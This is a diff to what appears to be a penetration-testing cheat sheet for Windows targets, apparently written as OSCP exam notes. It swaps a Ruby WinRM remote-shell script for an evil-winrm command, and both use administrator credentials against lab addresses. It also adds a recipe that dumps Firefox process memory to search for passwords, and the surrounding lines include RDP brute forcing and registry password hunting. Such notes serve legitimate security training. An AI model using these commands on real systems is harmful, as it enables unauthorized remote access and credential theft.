@@ -394,32 +394,8 @@ ncrack -vv --user Administrator -P /root/oscp/passwords.txt rdp://10.11.1.111
 ## WinRM - 5985
 
 ```
-gem install winrm
-root@kali:~# cat winrm_shell.rb
-require 'winrm'
-
-conn = WinRM::Connection.new(
-  endpoint: 'http://192.168.78.185:5985/wsman',
-  user: 'administrator',
-  password: 'administrator123',
-)
-
-command=""
-
-conn.shell(:powershell) do |shell|
-    until command == "exit\n" do
-        print "PS > "
-        command = gets        
-        output = shell.run(command) do |stdout, stderr|
-            STDOUT.print stdout
-            STDERR.print stderr
-        end
-    end    
-    puts "Exiting with code #{output.exitcode}"
-end
-root@kali:~# ruby winrm_shell.rb
-PS > whoami
-test\administrator
+https://github.com/Hackplayers/evil-winrm
+./evil-winrm.rb -i 10.11.1.111 -u Administrator -p 'password1'
 ```
 
 
@@ -1231,11 +1207,19 @@ reg query HKCU /f password /t REG_SZ /s
 
 - Unquoted service paths
 
-Check book for instructions
-
 - Weak service permissions
 
-Check book for instructions
+https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/
+
+### Dump process for passwords
+
+```powershell
+# Looking for Firefox
+Get-Process
+./procdump64.exe -ma $PID-FF
+Select-String -Path .\*.dmp -Pattern 'password' > 1.txt
+type 1.txt | findstr /s /i "admin"
+```
 
 ### Inside service
 
